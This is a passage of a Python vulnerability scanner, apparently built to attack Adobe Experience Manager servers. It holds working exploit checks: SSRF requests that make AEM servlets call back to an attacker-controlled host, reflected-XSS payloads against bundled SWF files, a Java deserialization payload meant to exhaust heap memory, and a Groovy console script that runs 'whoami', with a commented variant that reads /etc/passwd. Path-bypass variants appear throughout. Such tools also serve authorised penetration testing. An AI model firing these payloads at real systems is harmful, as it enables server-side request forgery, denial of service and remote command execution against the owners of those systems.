        '/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet;%0a{0}.png?url={{0}}%23/api1.omniture.com/a&q=a',
        '/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet;%0a{0}.gif?url={{0}}%23/api1.omniture.com/a&q=a',
        '/libs/cq/contentinsight/content/proxy.reportingservices.json/{0}.css?url={{0}}%23/api1.omniture.com/a&q=a',
        '/libs/cq/contentinsight/content/proxy.reportingservices.json/{0}.js?url={{0}}%23/api1.omniture.com/a&q=a',
        '/libs/cq/contentinsight/content/proxy.reportingservices.json/{0}.html?url={{0}}%23/api1.omniture.com/a&q=a',
        '/libs/cq/contentinsight/content/proxy.reportingservices.json/{0}.ico?url={{0}}%23/api1.omniture.com/a&q=a',
        '/libs/cq/contentinsight/content/proxy.reportingservices.json/{0}.png?url={{0}}%23/api1.omniture.com/a&q=a',
        '/libs/cq/contentinsight/content/proxy.reportingservices.json;%0a{0}.css?url={{0}}%23/api1.omniture.com/a&q=a',
        '/libs/cq/contentinsight/content/proxy.reportingservices.json;%0a{0}.js?url={{0}}%23/api1.omniture.com/a&q=a',
        '/libs/cq/contentinsight/content/proxy.reportingservices.json;%0a{0}.html?url={{0}}%23/api1.omniture.com/a&q=a',
        '/libs/cq/contentinsight/content/proxy.reportingservices.json;%0a{0}.png?url={{0}}%23/api1.omniture.com/a&q=a',
        '/libs/cq/contentinsight/content/proxy.reportingservices.json;%0a{0}.bmp?url={{0}}%23/api1.omniture.com/a&q=a',
        '///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet;%0a{0}.css?url={{0}}%23/api1.omniture.com/a&q=a',
        '///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet;%0a{0}.js?url={{0}}%23/api1.omniture.com/a&q=a',
        '///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet;%0a{0}.html?url={{0}}%23/api1.omniture.com/a&q=a',
        '///libs///cq/contentinsight///proxy///reportingservices.json.GET.servlet;%0a{0}.png?url={{0}}%23/api1.omniture.com/a&q=a',
        '///libs///cq/contentinsight///proxy///reportingservices.json.GET.servlet;%0a{0}.gif?url={{0}}%23/api1.omniture.com/a&q=a',
        '///libs///cq///contentinsight///content///proxy.reportingservices.json/{0}.css?url={{0}}%23/api1.omniture.com/a&q=a',
        '///libs///cq///contentinsight///content///proxy.reportingservices.json/{0}.js?url={{0}}%23/api1.omniture.com/a&q=a',
        '///libs///cq///contentinsight///content///proxy.reportingservices.json/{0}.html?url={{0}}%23/api1.omniture.com/a&q=a',
        '///libs///cq///contentinsight///content///proxy.reportingservices.json/{0}.ico?url={{0}}%23/api1.omniture.com/a&q=a',
        '///libs///cq///contentinsight///content///proxy.reportingservices.json/{0}.png?url={{0}}%23/api1.omniture.com/a&q=a',
        '///libs///cq///contentinsight///content///proxy.reportingservices.json;%0a{0}.css?url={{0}}%23/api1.omniture.com/a&q=a',
        '///libs///cq///contentinsight///content///proxy.reportingservices.json;%0a{0}.js?url={{0}}%23/api1.omniture.com/a&q=a',
        '///libs///cq///contentinsight///content///proxy.reportingservices.json;%0a{0}.html?url={{0}}%23/api1.omniture.com/a&q=a',
        '///libs///cq///contentinsight///content///proxy.reportingservices.json;%0a{0}.ico?url={{0}}%23/api1.omniture.com/a&q=a',
        '///libs///cq///contentinsight///content///proxy.reportingservices.json;%0a{0}.png?url={{0}}%23/api1.omniture.com/a&q=a'
    )
    cache_buster = random_string()
    REPOSTINGSERVICESSERVLET2 = (path.format(cache_buster) for path in REPOSTINGSERVICESSERVLET2)

    REPOSTINGSERVICESSERVLET3 = (
        '/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.{0}.css?url={{0}}%23/api1.omniture.com/a&q=a',
        '/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.{0}.js?url={{0}}%23/api1.omniture.com/a&q=a',
        '/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.{0}.html?url={{0}}%23/api1.omniture.com/a&q=a',
        '/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.{0}.ico?url={{0}}%23/api1.omniture.com/a&q=a',
        '/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.{0}.png?url={{0}}%23/api1.omniture.com/a&q=a',
        '/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.{0}.bmp?url={{0}}%23/api1.omniture.com/a&q=a',
        '///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.{0}.css?url={{0}}%23/api1.omniture.com/a&q=a',
        '///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.{0}.html?url={{0}}%23/api1.omniture.com/a&q=a',
        '///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.{0}.ico?url={{0}}%23/api1.omniture.com/a&q=a',
        '///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.{0}.png?url={{0}}%23/api1.omniture.com/a&q=a',
        '///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.{0}.bmp?url={{0}}%23/api1.omniture.com/a&q=a',
        '///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.{0}.js?url={{0}}%23/api1.omniture.com/a&q=a'
    )
    cache_buster = randint(0, 2**12)
    REPOSTINGSERVICESSERVLET3 = (path.format(cache_buster) for path in REPOSTINGSERVICESSERVLET3)

    for path in itertools.chain(REPOSTINGSERVICESSERVLET1, REPOSTINGSERVICESSERVLET2, REPOSTINGSERVICESSERVLET3):
        url = normalize_url(base_url, path)
        encoded_orig_url = (base64.b16encode(url.encode())).decode()
        back_url = 'http://{0}/{1}/reportingservices/{2}/'.format(my_host, token, encoded_orig_url)
        url = url.format(back_url)

        try:
            http_request(url, proxy=proxy)
        except:
            if debug:
                error('Exception while performing a check', check='ssrf_reportingservices_servlet', url=url)

    time.sleep(10)

    if 'reportingservices' in d:
        u = base64.b16decode(d.get('reportingservices')[0]).decode()
        f = Finding('ReportingServicesServlet', u,
                    'SSRF via SalesforceSecretServlet (CVE-2018-12809) was detected. '
                    'See - https://helpx.adobe.com/security/products/experience-manager/apsb18-23.html')

        results.append(f)

    return results


@register
def ssrf_sitecatalyst_servlet(base_url, my_host, debug=False, proxy=None):
    global token, d

    results = []

    SITECATALYST1 = (
        '/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet?datacenter={0}%23&company=xxx&username=zzz&secret=yyyy',
        '/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet.html?datacenter={0}%23&company=xxx&username=zzz&secret=yyyy',
        '/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet.4.2.1...json?datacenter={0}%23&company=xxx&username=zzz&secret=yyyy',
        '/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet.1.json?datacenter={0}%23&company=xxx&username=zzz&secret=yyyy',
        '/libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json?datacenter={0}%23&company=xxx&username=zzz&secret=yyyy',
        '/libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json/a.1.json?datacenter={0}%23&company=xxx&username=zzz&secret=yyyy',
        '/libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json/a.4.2.1...json?datacenter={0}%23&company=xxx&username=zzz&secret=yyyy',
        '///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet?datacenter={0}%23&company=xxx&username=zzz&secret=yyyy',
        '///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet.html?datacenter={0}%23&company=xxx&username=zzz&secret=yyyy',
        '///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet.1.json?datacenter={0}%23&company=xxx&username=zzz&secret=yyyy',
        '///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet.4.2.1...json?datacenter={0}%23&company=xxx&username=zzz&secret=yyyy',
        '///libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json?datacenter={0}%23&company=xxx&username=zzz&secret=yyyy',
        '///libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json/a.html?datacenter={0}%23&company=xxx&username=zzz&secret=yyyy',
        '///libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json/a.1.json?datacenter={0}%23&company=xxx&username=zzz&secret=yyyy',
        '///libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json/a.4.2.1...json?datacenter={0}%23&company=xxx&username=zzz&secret=yyyy'
    )

    SITECATALYST2 = (
        '/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet/{0}.css?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet/{0}.js?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet/{0}.png?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet/{0}.html?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet/{0}.bmp?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet;%0a{0}.css?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet;%0a{0}.js?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet;%0a{0}.html?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet;%0a{0}.png?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '/libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json/{0}.html?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '/libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json/{0}.css?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '/libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json/{0}.js?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '/libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json/{0}.png?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '/libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json/{0}.ico?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '/libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json;%0a{0}.css?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '/libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json;%0a{0}.js?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '/libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json;%0a{0}.html?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '/libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json;%0a{0}.png?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet///{0}.css?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet///{0}.js?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet///{0}.png?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet///{0}.html?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet///{0}.bmp?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet;%0a{0}.css?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet;%0a{0}.js?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet;%0a{0}.html?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet;%0a{0}.png?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '///libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json///{0}.html?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '///libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json///{0}.css?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '///libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json///{0}.js?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '///libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json///{0}.png?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '///libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json///{0}.ico?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '///libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json;%0a{0}.css?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '///libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json;%0a{0}.js?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '///libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json;%0a{0}.html?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '///libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json;%0a{0}.png?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy'
    )
    cache_buster = random_string()
    SITECATALYST2 = (path.format(cache_buster) for path in SITECATALYST2)

    SITECATALYST3 = (
        '/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet.{0}.css?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet.{0}.js?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet.{0}.html?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet.{0}.png?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet.{0}.gif?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet.{0}.css?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet.{0}.js?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet.{0}.html?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet.{0}.png?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
        '///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet.{0}.gif?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy'
    )
    cache_buster = randint(1, 2**12)
    SITECATALYST3 = (path.format(cache_buster) for path in SITECATALYST3)


    for path in itertools.chain(SITECATALYST1, SITECATALYST2, SITECATALYST3):
        url = normalize_url(base_url, path)
        encoded_orig_url = (base64.b16encode(url.encode())).decode()
        back_url = 'http://{0}/{1}/sitecatalyst/{2}/'.format(my_host, token, encoded_orig_url)
        url = url.format(back_url)

        try:
            http_request(url, proxy=proxy)
        except:
            if debug:
                error('Exception while performing a check', check='ssrf_sitecatalyst_servlet', url=url)

    time.sleep(10)

    if 'sitecatalyst' in d:
        u = base64.b16decode(d.get('sitecatalyst')[0]).decode()
        f = Finding('SiteCatalystServlet', u,
                    'SSRF via SiteCatalystServlet was detected. '
                    'It might result in RCE - https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps?slide=87')

        results.append(f)

    return results


@register
def ssrf_autoprovisioning_servlet(base_url, my_host, debug=False, proxy=None):
    global token, d

    results = []

    AUTOPROVISIONING1 = itertools.product(
        (
            '/libs/cq/cloudservicesprovisioning/content/autoprovisioning',
            '///libs///cq///cloudservicesprovisioning///content///autoprovisioning'
        ),
        (
            '.json', '.4.2.1...json', '.1.json', '.html', '.html/a.1.json', '.html/a.4.2.1...json'
        )
    )
    AUTOPROVISIONING1 = list('{0}{1}'.format(p1, p2) for p1, p2 in AUTOPROVISIONING1)

    AUTOPROVISIONING2 = itertools.product(
        (
            '/libs/cq/cloudservicesprovisioning/content/autoprovisioning',
            '///libs///cq///cloudservicesprovisioning///content///autoprovisioning'
        ),
        (
            '.json;%0a{0}.css', '.json;%0a{0}.png', '.html;%0a{0}.css', '.html;%0a{0}.png', '.json/{0}.css', '.json/{0}.js',
            '.json/{0}.png', '.json/a.gif', '.html/{0}.css', '.html/{0}.js', '.html/{0}.png',  '.json/{0}.html'
        )
    )
    cache_buster = random_string()
    AUTOPROVISIONING2 = list('{0}{1}'.format(p1, p2.format(cache_buster)) for p1, p2 in AUTOPROVISIONING2)


    AUTOPROVISIONING3 = itertools.product(
        (
            '/libs/cq/cloudservicesprovisioning/content/autoprovisioning',
            '///libs///cq///cloudservicesprovisioning///content///autoprovisioning'
        ),
        (
            '.{0}.css', '.{0}.js', '.{0}.ico', '.{0}.png', '.{0}.jpeg', '.{0}.gif'
        )
    )
    cache_buster = randint(1, 2**12)
    AUTOPROVISIONING3 = list('{0}{1}'.format(p1, p2.format(cache_buster)) for p1, p2 in AUTOPROVISIONING3)

    for path in itertools.chain(AUTOPROVISIONING1, AUTOPROVISIONING2, AUTOPROVISIONING3):
        url = normalize_url(base_url, path)
        enc_orig_url = (base64.b16encode(url.encode())).decode()
        back_url = 'http://{0}/{1}/autoprovisioning/{2}/'.format(my_host, token, enc_orig_url)

        data = 'servicename=analytics&analytics.server={0}&analytics.company=1&analytics.username=2&analytics.secret=3&analytics.reportsuite=4'
        data = data.format(back_url)
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': base_url}

        try:
            http_request(url, 'POST', data=data, additional_headers=headers, proxy=proxy)
        except:
            if debug:
                error('Exception while performing a check', check='ssrf_autoprovisioning_servlet', url=url)

    time.sleep(10)

    if 'autoprovisioning' in d:
        u = base64.b16decode(d.get('autoprovisioning')[0]).decode()
        f = Finding('AutoProvisioningServlet', u,
                    'SSRF via AutoProvisioningServlet was detected. '
                    'It might result in RCE - https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps?slide=87')

        results.append(f)

    return results


@register
def ssrf_opensocial_proxy(base_url, my_host, debug=False, proxy=None):
    global token, d

    results = []

    OPENSOCIAL1 = itertools.product(
        (
            '/libs/opensocial/proxy{0}?container=default&url={{0}}',
            '///libs///opensocial///proxy{0}?container=default&url={{0}}'
        ),
        (
            '', '.json', '.1.json', '.4.2.1...json', '.html'
        )
    )
    OPENSOCIAL1 = list(pair[0].format(pair[1]) for pair in OPENSOCIAL1)

    OPENSOCIAL2 = itertools.product(
        (
            '/libs/opensocial/proxy{0}?container=default&url={{0}}',
            '///libs///opensocial///proxy{0}?container=default&url={{0}}'
        ),
        (
           '/{0}.1.json', '/{0}.4.2.1...json', '/{0}.css', '/{0}.js', '/{0}.png', '/{0}.bmp', ';%0a{0}.css', ';%0a{0}.js',
           ';%0a{0}.png', ';%0a{0}.html', ';%0a{0}.ico', ';%0a{0}.png', '/{0}.ico', './{0}.html'
        )
    )
    cache_buster = random_string()
    OPENSOCIAL2 = list(pair[0].format(pair[1].format(cache_buster)) for pair in OPENSOCIAL2)

    OPENSOCIAL3 = itertools.product(
        (
            '/libs/opensocial/proxy{0}?container=default&url={{0}}',
            '///libs///opensocial///proxy{0}?container=default&url={{0}}'
        ),
        (
            '.{0}.css', '.{0}.js', '.{0}.png', '.{0}.ico', '.{0}.bmp', '.{0}.gif', '.{0}.html'
        )
    )
    cache_buster = randint(1, 2**12)
    OPENSOCIAL3 = list(pair[0].format(pair[1].format(cache_buster)) for pair in OPENSOCIAL3)

    for path in itertools.chain(OPENSOCIAL1, OPENSOCIAL2, OPENSOCIAL3):
        url = normalize_url(base_url, path)
        encoded_orig_url = (base64.b16encode(url.encode())).decode()
        back_url = 'http://{0}/{1}/opensocial/{2}/'.format(my_host, token, encoded_orig_url)
        url = url.format(back_url)

        try:
            http_request(url, proxy=proxy)
        except:
            if debug:
                error('Exception while performing a check', check='ssrf_opensocial_proxy', url=url)

    time.sleep(10)

    if 'opensocial' in d:
        u = base64.b16decode(d.get('opensocial')[0]).decode()
        f = Finding('Opensocial (shindig) proxy', u,
                    'SSRF via Opensocial (shindig) proxy. '
                    'See - https://speakerdeck.com/fransrosen/a-story-of-the-passive-aggressive-sysadmin-of-aem?slide=41')

        results.append(f)

    return results


@register
def ssrf_opensocial_makeRequest(base_url, my_host, debug=False, proxy=None):
    global token, d

    results = []

    MAKEREQUEST1 = itertools.product(
        (
            '/libs/opensocial/makeRequest{0}?url={{0}}',
            '///libs///opensocial///makeRequest{0}?url={{0}}'
        ),
        (
            '', '.json', '.1.json', '.4.2.1...json', '.html'
        )
    )
    MAKEREQUEST1 = list(pair[0].format(pair[1]) for pair in MAKEREQUEST1)

    MAKEREQUEST2 = itertools.product(
        (
            '/libs/opensocial/makeRequest{0}?url={{0}}',
            '///libs///opensocial///makeRequest{0}?url={{0}}'
        ),
        (
           '/{0}.1.json', '/{0}.4.2.1...json', '/{0}.css', '/{0}.js', '/{0}.png', '/{0}.bmp', ';%0a{0}.css', ';%0a{0}.js',
           ';%0a{0}.png', ';%0a{0}.html', ';%0a{0}.ico', ';%0a{0}.png', '/{0}.ico', './{0}.html'
        )
    )
    cache_buster = random_string()
    MAKEREQUEST2 = list(pair[0].format(pair[1].format(cache_buster)) for pair in MAKEREQUEST2)

    MAKEREQUEST3 = itertools.product(
        (
            '/libs/opensocial/makeRequest{0}?url={{0}}',
            '///libs///opensocial///makeRequest{0}?url={{0}}'
        ),
        (
            '.{0}.css', '.{0}.js', '.{0}.png', '.{0}.ico', '.{0}.bmp', '.{0}.gif', '.{0}.html'
        )
    )
    cache_buster = randint(1, 2**12)
    MAKEREQUEST3 = list(pair[0].format(pair[1].format(cache_buster)) for pair in MAKEREQUEST3)

    for path in itertools.chain(MAKEREQUEST1, MAKEREQUEST2, MAKEREQUEST3):
        url = normalize_url(base_url, path)
        encoded_orig_url = (base64.b16encode(url.encode())).decode()
        back_url = 'http://{0}/{1}/opensocialmakerequest/{2}/'.format(my_host, token, encoded_orig_url)
        url = url.format(back_url)

        try:
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': base_url}
            data = 'httpMethod=GET'
            http_request(url, 'POST', data=data, additional_headers=headers, proxy=proxy)
        except:
            if debug:
                error('Exception while performing a check', check='ssrf_opensocial_makeRequest', url=url)

    time.sleep(10)

    if 'opensocialmakerequest' in d:
        u = base64.b16decode(d.get('opensocialmakerequest')[0]).decode()
        f = Finding('Opensocial (shindig) makeRequest', u,
                    'SSRF via Opensocial (shindig) makeRequest. Yon can specify parameters httpMethod, postData, headers, contentType for makeRequest.')

        results.append(f)

    return results


@register
def swf_xss(base_url, my_host, debug=False, proxy=None):
    SWFS = (
        '/etc/clientlibs/foundation/video/swf/player_flv_maxi.swf?onclick=javascript:confirm(document.domain)',
        '/etc/clientlibs/foundation/video/swf/player_flv_maxi.swf.res?onclick=javascript:confirm(document.domain)',
        '/etc/clientlibs/foundation/shared/endorsed/swf/slideshow.swf?contentPath=%5c"))%7dcatch(e)%7balert(document.domain)%7d//',
        '/etc/clientlibs/foundation/shared/endorsed/swf/slideshow.swf.res?contentPath=%5c"))%7dcatch(e)%7balert(document.domain)%7d//',
        '/etc/clientlibs/foundation/video/swf/StrobeMediaPlayback.swf?javascriptCallbackFunction=alert(document.domain)-String',
        '/etc/clientlibs/foundation/video/swf/StrobeMediaPlayback.swf.res?javascriptCallbackFunction=alert(document.domain)-String',
        '/libs/dam/widgets/resources/swfupload/swfupload_f9.swf?swf?movieName=%22])%7dcatch(e)%7bif(!this.x)alert(document.domain),this.x=1%7d//',
        '/libs/dam/widgets/resources/swfupload/swfupload_f9.swf.res?swf?movieName=%22])%7dcatch(e)%7bif(!this.x)alert(document.domain),this.x=1%7d//',
        '/libs/cq/ui/resources/swfupload/swfupload.swf?movieName=%22])%7dcatch(e)%7bif(!this.x)alert(document.domain),this.x=1%7d//',
        '/libs/cq/ui/resources/swfupload/swfupload.swf.res?movieName=%22])%7dcatch(e)%7bif(!this.x)alert(document.domain),this.x=1%7d//',
        '/etc/dam/viewers/s7sdk/2.11/flash/VideoPlayer.swf?stagesize=1&namespacePrefix=alert(document.domain)-window',
        '/etc/dam/viewers/s7sdk/2.11/flash/VideoPlayer.swf.res?stagesize=1&namespacePrefix=alert(document.domain)-window',
        '/etc/dam/viewers/s7sdk/2.9/flash/VideoPlayer.swf?loglevel=,firebug&movie=%5c%22));if(!self.x)self.x=!alert(document.domain)%7dcatch(e)%7b%7d//',
        '/etc/dam/viewers/s7sdk/2.9/flash/VideoPlayer.swf.res?loglevel=,firebug&movie=%5c%22));if(!self.x)self.x=!alert(document.domain)%7dcatch(e)%7b%7d//',
        '/etc/dam/viewers/s7sdk/3.2/flash/VideoPlayer.swf?stagesize=1&namespacePrefix=window[/aler/.source%2b/t/.source](document.domain)-window',
        '/etc/dam/viewers/s7sdk/3.2/flash/VideoPlayer.swf.res?stagesize=1&namespacePrefix=window[/aler/.source%2b/t/.source](document.domain)-window'
    )

    results = []
    for path in SWFS:
        url = normalize_url(base_url, path)
        try:
            resp = http_request(url, proxy=proxy)

            ct = content_type(resp.headers.get('Content-Type', ''))
            cd = resp.headers.get('Content-Disposition', '')
            if resp.status_code == 200 and ct == 'application/x-shockwave-flash' and not cd:
                f = Finding('Reflected XSS via SWF', url,
                            'AEM exposes SWF that might be vulnerable to reflected XSS. '
                            'See - https://speakerdeck.com/fransrosen/a-story-of-the-passive-aggressive-sysadmin-of-aem?slide=61')

                results.append(f)
        except:
            if debug:
                error('Exception while performing a check', check='swf_xss', url=url)

    return results


@register
def deser_externaljob_servlet(base_url, my_host, debug=False, proxy=None):
    DESERPAYLOAD = base64.b64decode('rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH////c=')  # Generated with oisdos - java -Xmx25g -jar target/oisdos-1.0.jar ObjectArrayHeap

    EXTERNALJOBSERVLET = itertools.product(('/libs/dam/cloud/proxy', '///libs///dam///cloud///proxy'),
                                           ('.json', '.css', '.js', '.html', '.ico', '.png', '.gif', '.1.json',
                                            '.4.2.1...json', '.json;%0aa.css', '.json;%0aa.html', '.json;%0aa.ico'))
    EXTERNALJOBSERVLET = list('{0}{1}'.format(p1, p2) for p1, p2 in EXTERNALJOBSERVLET)


    results = []
    for path in EXTERNALJOBSERVLET:
        url = normalize_url(base_url, path)
        data = {':operation': ('', 'job'), 'file': ('jobevent', DESERPAYLOAD, 'application/octet-stream')}
        headers = {'Referer': base_url}
        try:
            resp = http_request_multipart(url, data=data, additional_headers=headers, proxy=proxy)

            if resp.status_code == 500 and 'Java heap space' in str(resp.content):
                f = Finding('ExternalJobServlet', url,
                            'ExternalJobServlet is vulnerable to Java untrusted data deserialization. '
                            'See - https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps?slide=102')

                results.append(f)
                break
        except:
            if debug:
                error('Exception while performing a check', check='deser_externaljob_servlet', url=url)

    return results


@register
def exposed_webdav(base_url, my_host, debug=False, proxy=None):
    WEBDAV = itertools.product(('/crx/repository/test.sh', ),
                                           ('', '.json', '.css', '.js', '.html', '.ico', '.png', '.gif',
                                            ';%0aa.css', ';%0aa.js', ';%0aa.html', ';%0aa.ico', ';%0aa.png',
                                            '/a.css', '/a.html', '/a.js', '/a.ico', '/a.png', '/a.ico'))
    WEBDAV = list('{0}{1}'.format(p1, p2) for p1, p2 in WEBDAV)

    results = []
    for path in WEBDAV:
        try:
            url = normalize_url(base_url, path)
            resp = http_request(url, proxy=proxy)
            www_authenticate = resp.headers.get('WWW-Authenticate', '').lower()
            if resp.status_code == 401 and 'webdav' in www_authenticate:
                f = Finding('WebDAV exposed', url,
                            'WebDAV might we vulnerable to CVE-2015-1833. Check it manually. '
                            'See - http://mail-archives.apache.org/mod_mbox/jackrabbit-announce/201505.mbox/raw/%3C555DA644.8080908@greenbytes.de%3E/3')

                results.append(f)

                break

        except:
            if debug:
                error('Exception while performing a check', check='exposed_webdav', url=url)

    return results


@register
def exposed_groovy_console(base_url, my_host, debug=False, proxy=None):
    SCRIPT = 'def%20command%20%3D%20%22whoami%22%0D%0Adef%20proc%20%3D%20command.execute%28%29%0D%0Aproc.waitFor%28%29%0D%0Aprintln%20%22%24%7Bproc.in.text%7D%22'  # 'def+proc+%3d+"cat+/etc/passwd".execute()%0d%0aprintln+proc.text'

    GROOVYSCRIPT1 = itertools.product(
        ('/bin/groovyconsole/post.servlet', '///bin///groovyconsole///post.servlet'),
        ('', '.css', '.js', '.html', '.ico', '.png', '.json', '.1.json', '.4.2.1...json', ';%0aa.css', ';%0aa.html',
         ';%0aa.js', ';%0aa.ico', ';%0aa.png')
    )
    GROOVYSCRIPT1 = list('{0}{1}'.format(p1, p2) for p1, p2 in GROOVYSCRIPT1)

    GROOVYSCRIPT2 = itertools.product(
        ('/etc/groovyconsole/jcr:content.html', '///etc///groovyconsole///jcr:content.html'),
        ('', '/a.css', '/a.js', '/a.html', '/a.ico', '/a.png', '/a.1.json', '/a.4.2.1...json', ';%0aa.css', ';%0aa.html',
         ';%0aa.js', ';%0aa.ico', ';%0aa.png')
